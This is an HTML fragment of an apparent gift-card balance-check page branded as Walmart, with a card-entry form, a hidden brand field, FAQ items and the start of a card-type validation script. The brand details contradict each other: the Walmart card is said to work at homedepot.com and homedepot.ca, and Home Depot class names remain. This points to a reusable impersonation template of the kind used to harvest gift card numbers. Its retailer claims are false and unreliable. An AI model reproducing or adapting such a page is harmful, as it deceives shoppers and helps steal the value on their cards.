      ...
      <div class="container">
         ...
         <div class="row wow fadeIn sm-main-heig">
            ...
            <div class="col-md-6 mb-4  text-md-left  sm-hide" style="">
               <div class="card px-4 py-4">
                  <h1 class="display-5 font-weight-bold"><span class="home-depo-color">Walmart</span> ® Gift Card </h1>
                  <hr class="">
                  <p>The Walmart Gift Card may be used toward the purchase of merchandise at homedepot.com and any of The Walmart stores for up to the amount displayed.</p>
               </div>
            </div>
         ...
         <form method="post" action="#" id="balance_dude" name="balance_dude">
            ...
            <div class="row justify-content-center d-flex">
			   ...
			   <input type="hidden" id="cardtext" name="cardtext" value="Walmart">
      ...
      <div class="row cust-sec-crd">
         <div class="col-md-4 mt-2">
            <div class="card text-center p-3 rounded-0" style="box-shadow: 0 0 10px 0 rgba(0,0,0,.12);	">
               ...
               <p class="content-text">Walmart Gift Cards are a simple, safe and convenient method of gifting our products.</p>
            </div>
         </div>
         <div class="col-md-4 mt-2">
            <div class="card text-center p-3 rounded-0" style="box-shadow: 0 0 10px 0 rgba(0,0,0,.12);	">
         ...
         <div class="col-md-4 mt-2">
            <div class="card text-center p-3 rounded-0" style="box-shadow: 0 0 10px 0 rgba(0,0,0,.12);	">
               ...
               <p class="content-text">Can be used wherever at any Walmart in the US & Canada as well as in our Online-Shop</p>
            </div>
         </div>
      </div>
   </div>
               ...
               <div class="accordion" id="accordionExample">
                  <div class=" pt-0">
                     <div class="card-header p-0" id="headingOne">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se home-depo-color" data-toggle="collapse" data-Walmart="#collapseOne"><i class="fa fa-angle-right"></i> Can I buy The Walmart Gift Card and have you send it to someone else?
                           ?</div>									
                        </h2>
                     </div>
                  ...
                  <div class=" p-0">
                     <div class="card-header p-0" id="headingTwo">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se collapsed home-depo-color" data-toggle="collapse" data-Walmart="#collapseTwo"><i class="fa fa-angle-right"></i>Where do you ship Gift Cards?
                           Cai i buy Walmart gift card and send it to someone else ?
                           </div>
                        </h2>
                     </div>
                  ...
                  <div class=" pt-0">
                     <div class="card-header p-0 " id="headingThree">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se collapsed home-depo-color" data-toggle="collapse" data-Walmart="#collapseThree"><i class="fa fa-angle-right"></i> Are Canadian Gift Cards available?
                           </div>                     
                        </h2>
                     </div>
                     <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordionExample">
                        <div class="card-body ml-4">
                           <p>You can purchase a Canadian Walmart Gift Card online at homedepot.ca You may also purchase Canadian Gift Cards by visiting a local Walmart store in Canada.</p>
                        </div>
                     </div>
                  </div>
                  <div class=" pt-0">
                     <div class="card-header p-0 " id="headingFour">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se collapsed home-depo-color" data-toggle="collapse" data-Walmart="#collapseFour"><i class="fa fa-angle-right"></i> How do I place a Corporate Gift Card order?
                           </div>                     
                        </h2>
                     </div>
                     <div id="collapseFour" class="collapse" aria-labelledby="headingFour" data-parent="#accordionExample">
                        <div class="card-body ml-4">
                           <p>You may order Walmart Corporate Gift Cards by visiting the Walmart Corporate Gift Card page. For questions regarding an order, you may call a Gift Card sales associate .</p>
                        </div>
                     </div>
                  </div>
               </div>
...
$(".img-show").hover(function(){
	...
	function validateFun() {
		...
		if(flag==false){
			...
			if (cardtype == 8) { //Walmart Giftcard
